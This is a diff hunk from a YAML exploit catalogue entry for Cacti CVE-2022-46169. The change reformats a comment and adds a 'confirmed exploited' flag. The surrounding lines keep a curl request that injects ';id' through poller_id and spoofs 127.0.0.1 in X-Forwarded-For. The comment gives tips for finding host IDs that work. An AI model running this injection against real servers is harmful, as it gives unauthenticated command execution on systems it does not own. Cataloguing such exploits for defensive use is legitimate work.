@@ -117,19 +117,16 @@ functions:
         --data-urlencode "host_id=1" \
         --data-urlencode "poller_id=;id" \
         -H "X-Forwarded-For: 127.0.0.1"
-    comment: |
-      CVE-2022-46169: the poller_id GET parameter in remote_agent.php is concatenated
-      into a shell command string without sanitization, then passed to proc_open.
-      The X-Forwarded-For header spoofs the client IP as 127.0.0.1, satisfying the
-      IP-based authentication check that restricts access to trusted Cacti servers.
-
-      host_id and local_data_ids[0] must reference an existing monitored host and its
-      associated data source in the Cacti database. Default installs with at least one
-      monitored device typically have host_id=1 and local_data_ids[0]=1. Increment
-      both values (1, 2, 3...) if the initial attempt returns no output.
-
-      Command output is returned inline in the HTTP response body.
-      Ref: https://www.exploit-db.com/exploits/51166
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2022-46169:\
+      \ the poller_id GET parameter in remote_agent.php is concatenated\ninto a shell\
+      \ command string without sanitization, then passed to proc_open.\nThe X-Forwarded-For\
+      \ header spoofs the client IP as 127.0.0.1, satisfying the\nIP-based authentication\
+      \ check that restricts access to trusted Cacti servers.\n\nhost_id and local_data_ids[0]\
+      \ must reference an existing monitored host and its\nassociated data source\
+      \ in the Cacti database. Default installs with at least one\nmonitored device\
+      \ typically have host_id=1 and local_data_ids[0]=1. Increment\nboth values (1,\
+      \ 2, 3...) if the initial attempt returns no output.\n\nCommand output is returned\
+      \ inline in the HTTP response body.\nRef: https://www.exploit-db.com/exploits/51166\n"
     contexts:
       unauthenticated:
     version: |-
